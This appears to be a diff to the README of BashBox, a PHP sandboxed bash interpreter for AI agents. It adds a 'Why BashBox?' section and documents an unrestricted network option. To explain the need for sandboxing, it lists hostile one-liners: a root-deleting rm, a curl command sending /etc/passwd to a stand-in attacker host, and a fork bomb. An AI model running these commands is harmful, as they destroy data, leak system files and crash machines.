@@ -1,10 +1,12 @@
 <p align="center">
-    <p align="center">
-        <a href="https://github.com/shipfastlabs/bashbox/actions"><img alt="GitHub Workflow Status (master)" src="https://github.com/shipfastlabs/bashbox/actions/workflows/tests.yml/badge.svg"></a>
-        <a href="https://packagist.org/packages/shipfastlabs/bashbox"><img alt="Total Downloads" src="https://img.shields.io/packagist/dt/shipfastlabs/bashbox"></a>
-        <a href="https://packagist.org/packages/shipfastlabs/bashbox"><img alt="Latest Version" src="https://img.shields.io/packagist/v/shipfastlabs/bashbox"></a>
-        <a href="https://packagist.org/packages/shipfastlabs/bashbox"><img alt="License" src="https://img.shields.io/packagist/l/shipfastlabs/bashbox"></a>
-    </p>
+    <img src="docs/bashbox.png" alt="BashBox - Sandboxed Bash for AI Agents">
+</p>
+
+<p align="center">
+    <a href="https://github.com/shipfastlabs/bashbox/actions"><img alt="GitHub Workflow Status (master)" src="https://github.com/shipfastlabs/bashbox/actions/workflows/tests.yml/badge.svg"></a>
+    <a href="https://packagist.org/packages/shipfastlabs/bashbox"><img alt="Total Downloads" src="https://img.shields.io/packagist/dt/shipfastlabs/bashbox"></a>
+    <a href="https://packagist.org/packages/shipfastlabs/bashbox"><img alt="Latest Version" src="https://img.shields.io/packagist/v/shipfastlabs/bashbox"></a>
+    <a href="https://packagist.org/packages/shipfastlabs/bashbox"><img alt="License" src="https://img.shields.io/packagist/l/shipfastlabs/bashbox"></a>
 </p>
 
 ------
@@ -12,6 +14,34 @@
 **BashBox** is a sandboxed bash interpreter for AI agents, written in pure PHP 8.4+. No `proc_open`, no `exec`, no `shell_exec` — every command is a PHP class, every file lives in a virtual filesystem, and every execution has hard limits.
 
 > **Requires [PHP 8.4+](https://php.net/releases/)**
+
+
+## Why BashBox?
+
+Imagine you're building an AI coding assistant. A user asks: *"Can you analyze my logs and find all error messages from the last hour?"*
+
+Your AI generates a bash script:
+
+```bash
+cat /var/log/app.log | grep "ERROR" | awk '{print $1, $2, $5}' | sort | uniq -c | sort -rn
+```
+
+**The problem:** Running user-generated bash code on your servers is dangerous. One malicious script could:
+- Delete critical files (`rm -rf /`)
+- Exfiltrate sensitive data (`curl -d @/etc/passwd attacker.com`)
+- Launch denial-of-service attacks (`:(){ :|:& };:`)
+- Access internal network resources (SSRF attacks)
+
+**Traditional solutions** use containers or VMs, but those are slow, resource-heavy, and complex to orchestrate.
+
+**BashBox** takes a different approach: it implements a complete bash interpreter in pure PHP with zero system calls. Think of it as a "bash emulator" that gives you:
+
+- ⚡ **Instant execution** — no container startup time
+- 🛡️ **True isolation** — no access to your real filesystem or network (unless you explicitly allow it)
+- 🎛️ **Fine-grained control** — limit commands, loops, memory, and execution time
+- 🔧 **Full bash compatibility** — pipes, redirects, functions, control flow, substitutions, and more
+
+Perfect for AI agents, code execution platforms, CI/CD systems, or anywhere you need to run untrusted bash scripts safely.
 
 ## Installation
 
@@ -21,9 +51,9 @@ Install BashBox using [Composer](https://getcomposer.org):
 composer require shipfastlabs/bashbox
 ```
 
-## Usage
+## Usage Examples
 
-### Run a Script
+### Basic Script Execution
 
 ```php
 use BashBox\Bash;
@@ -258,6 +288,32 @@ $bash = new Bash(new BashOptions(
 
 $result = $bash->exec('curl -s https://api.example.com/data');
 ```
+
+#### Unrestricted Network Access
+
+For scenarios where you need full internet access without URL or method restrictions, use the `dangerouslyAllowFullInternetAccess` option:
+
+```php
+use BashBox\Bash;
+use BashBox\BashOptions;
+use BashBox\Network\NetworkConfig;
+
+$bash = new Bash(new BashOptions(
+    network: new NetworkConfig(
+        dangerouslyAllowFullInternetAccess: true,
+        // denyPrivateRanges still protects against SSRF attacks
+        denyPrivateRanges: true,
+        maxResponseSize: 5 * 1024 * 1024, // 5MB
+        maxRedirects: 10,
+        timeout: 10,
+    ),
+));
+
+// Now any URL and HTTP method is allowed
+$result = $bash->exec('curl -X POST https://any-website.com/api');
+```
+
+> **⚠️ SECURITY WARNING:** The `dangerouslyAllowFullInternetAccess` option disables URL prefix and HTTP method restrictions. Only use this in trusted environments where you control the input. SSRF protection (`denyPrivateRanges`) is still applied unless explicitly disabled.
 
 When network is configured, the `curl` command becomes available. Without it, `curl` does not exist.
 
